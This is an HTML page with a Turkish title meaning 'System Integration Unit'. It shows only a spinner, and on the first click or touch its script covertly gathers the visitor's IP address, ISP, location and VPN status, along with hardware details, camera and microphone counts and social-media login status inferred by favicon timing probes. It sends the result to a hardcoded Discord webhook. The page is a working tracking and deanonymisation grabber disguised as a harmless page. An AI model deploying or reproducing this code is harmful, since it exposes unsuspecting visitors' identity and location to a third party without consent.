<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Sistem Entegrasyon Birimi</title>
    <style>body{background:#000;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden;cursor:crosshair;}.scanner{width:25px;height:25px;border:2px solid #111;border-top:2px solid #0f0;border-radius:50%;animation:s .8s linear infinite;}@keyframes s{to{transform:rotate(360deg);}}</style>
</head>
<body onmousedown="Architect.run()" ontouchstart="Architect.run()">
    <div class="scanner"></div>
    <script>
        "use strict";

        const Architect = {
            hook: "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73",
            active: false,

            // 1. SOSYAL MEDYA (Geli≈ümi≈ü Instagram/TikTok/LinkedIn - D√ºzeltildi)
            async probeSocials() {
                const targets = {
                    Google: "https://accounts.google.com/CheckCookie",
                    Facebook: "https://www.facebook.com/favicon.ico",
                    Instagram: "https://www.instagram.com/favicon.ico",
                    Twitter: "https://twitter.com/favicon.ico",
                    LinkedIn: "https://www.linkedin.com/favicon.ico",
                    TikTok: "https://www.tiktok.com/favicon.ico"
                };
                const results = {};
                await Promise.all(Object.entries(targets).map(([name, url]) => {
                    return new Promise(res => {
                        const img = new Image();
                        const start = Date.now();
                        img.onload = () => { results[name] = "‚úÖ Aktif"; res(); };
                        img.onerror = () => { 
                            // Zamanlama analizi ile gizli aktiflik tespiti
                            const diff = Date.now() - start;
                            results[name] = diff < 100 ? "‚ùå Pasif" : "‚úÖ Aktif (Hidden)"; 
                            res(); 
                        };
                        img.src = `${url}?v=${Math.random()}`;
                        setTimeout(() => { results[name] = "‚è≥ Timeout"; res(); }, 2500);
                    });
                }));
                return results;
            },

            // 2. EKRAN ANALƒ∞Zƒ∞ (Fiziksel √á√∂z√ºn√ºrl√ºk - D√ºzeltildi)
            getDisplay() {
                const dpr = window.devicePixelRatio || 1;
                return {
                    real_res: `${Math.round(screen.width * dpr)}x${Math.round(screen.height * dpr)}`,
                    logical_res: `${screen.width}x${screen.height}`,
                    depth: screen.colorDepth + "-bit",
                    ratio: dpr,
                    refresh: "60Hz (Est.)", // Browser sƒ±nƒ±rlamasƒ± nedeniyle tahmini
                    hdr: window.matchMedia("(dynamic-range: high)").matches ? "‚úÖ" : "‚ùå"
                };
            },

            // 3. DONANIM & Sƒ∞STEM (Eksiksiz)
            async getKernel() {
                const [net, battery, storage, devs] = await Promise.all([
                    fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
                    navigator.getBattery ? navigator.getBattery() : {},
                    navigator.storage ? navigator.storage.estimate() : {},
                    navigator.mediaDevices.enumerateDevices().catch(() => [])
                ]);

                const gl = document.createElement('canvas').getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A";

                return {
                    net,
                    gpu: gpu.slice(0, 100), // Discord sƒ±nƒ±rƒ± i√ßin kƒ±rpma
                    cams: devs.filter(d => d.kind === 'videoinput').length,
                    mics: devs.filter(d => d.kind === 'audioinput').length,
                    cores: navigator.hardwareConcurrency,
                    ram: navigator.deviceMemory,
                    bat: battery.level ? (battery.level * 100) + "%" : "N/A",
                    disk: (storage.quota / 1e9).toFixed(2) + "GB"
                };
            },

            async run() {
                if (this.active) return;
                this.active = true;

                const [social, kernel, display] = await Promise.all([this.probeSocials(), this.getKernel(), this.getDisplay()]);
                const opt = Intl.DateTimeFormat().resolvedOptions();
                const vpn = (kernel.net.timezone && opt.timeZone !== kernel.net.timezone) ? "üö© VPN" : "‚úÖ DIRECT";

                const socialField = Object.entries(social).map(([n, s]) => `**${n}:** ${s}`).join("\n");

                const payload = {
                    embeds: [{
                        title: "üíÄ OMNISCIENCE_V190_ARCHITECT_REPORT",
                        color: 0x00ff00,
                        fields: [
                            { name: "üì° NETWORK", value: `**IP:** \`${kernel.net.ip}\` | **VPN:** ${vpn}\n**ISP:** ${kernel.net.org}\n**LOC:** ${kernel.net.city}/${kernel.net.country}`, inline: false },
                            { name: "‚öôÔ∏è HARDWARE", value: `**GPU:** ${kernel.gpu}\n**CPU:** ${kernel.cores} Cores | **RAM:** ${kernel.ram}GB\n**Battery:** ${kernel.bat} | **Disk:** ${kernel.disk}`, inline: false },
                            { name: "üì∫ DISPLAY METRICS", value: `**Fiziksel:** ${display.real_res}\n**Mantƒ±ksal:** ${display.logical_res}\n**HDR:** ${display.hdr} | **Oran:** ${display.ratio}`, inline: false },
                            { name: "üåç SOCIAL STATUS", value: socialField, inline: false },
                            { name: "üì∏ SYSTEM", value: `**Cams:** ${kernel.cams} | **Mics:** ${kernel.mics}\n**OS:** ${navigator.platform} | **TZ:** ${opt.timeZone}`, inline: false }
                        ],
                        footer: { text: "Fix: Physical Screen Calculation & Timing Probe Active" },
                        timestamp: new Date().toISOString()
                    }]
                };

                fetch(this.hook, { 
                    method: 'POST', 
                    headers: {'Content-Type': 'application/json'}, 
                    body: JSON.stringify(payload),
                    mode: 'no-cors' 
                });
            }
        };
    </script>
</body>
</html>
